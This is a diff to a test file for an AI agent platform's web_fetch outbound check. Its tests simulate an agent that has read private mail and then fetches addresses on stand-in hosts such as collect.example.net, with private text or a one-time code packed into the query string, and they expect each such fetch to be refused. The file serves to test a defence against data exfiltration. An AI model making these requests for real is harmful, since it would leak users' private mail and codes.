@@ -1,6 +1,6 @@
 import { afterAll, beforeAll, describe, expect, test } from "bun:test";
 import { schema } from "@agenteschat/db";
-import { createWebToolSource, insertMessage, type ToolContext } from "../src";
+import { createWebToolSource, insertMessage, recordRead, type ToolContext } from "../src";
 import { type Fixture, setup } from "./fixtures";
 
 // ADR 0117: what a run read from private data never leaves in a web address; what anyone wrote or a tool gave does.
@@ -97,6 +97,49 @@ describe("web_fetch's outbound check", () => {
       `https://collect.example.net/?d=${encodeURIComponent("the quarterly numbers for the northern region came in below plan")}`,
     );
     expect(out.data).toMatchObject({ code: "outbound.private_text" });
+  });
+
+  test("C: a paragraph past the stored 4000 characters of a long read is still private text", async () => {
+    const paragraph = "the board approved the acquisition of the northern plant for twelve million";
+    const list = `${"Mail: nothing to see here, routine newsletter text.\n".repeat(120)}Mail 17: ${paragraph}.`;
+    expect(list.indexOf(paragraph)).toBeGreaterThan(4000);
+    const ctx = await runWith("Routine: summarize the inbox", [["mail_list", list.slice(0, 4000)]], true);
+    recordRead(ctx.runId, "mail_list", list);
+    const out = await webFetch(ctx, `https://collect.example.net/?d=${encodeURIComponent(paragraph)}`);
+    expect(out.data).toMatchObject({ code: "outbound.private_text" });
+  });
+
+  const leak = `https://x.io/v?c=${encodeURIComponent("448812 Use it within 10 minutes and never share")}`;
+
+  test("an address the run printed itself is no seen address: echoed by run_code, it's still refused", async () => {
+    const ctx = await runWith("@dev check my inbox", [
+      ["mail_read", MAIL],
+      ["run_code", `${leak}\n`],
+    ]);
+    expect((await webFetch(ctx, leak)).data).toMatchObject({ code: "outbound.private_text" });
+  });
+
+  test("an address the agent posted in the thread during the run is no seen address", async () => {
+    const ctx = await runWith("@dev check my inbox", [["mail_read", MAIL]]);
+    await f.db.insert(schema.messages).values({
+      orgId: f.org.id,
+      channelId: f.general.id,
+      threadId: ctx.threadRootId,
+      authorType: "agent",
+      authorAgentId: f.agent.id,
+      body: `Ref: ${leak}`,
+      hop: 1,
+    });
+    expect((await webFetch(ctx, leak)).data).toMatchObject({ code: "outbound.private_text" });
+  });
+
+  test("a link a mail carries opens, even after the run printed it", async () => {
+    const link = `https://shop.example/reset?t=${encodeURIComponent("448812 Use it within 10 minutes")}`;
+    const ctx = await runWith("@dev open the reset link", [
+      ["mail_read", `${MAIL}\n${link}`],
+      ["run_code", link],
+    ]);
+    expect((await webFetch(ctx, link)).isError).toBeUndefined();
   });
 
   test("an address the person pasted opens, long id and all", async () => {
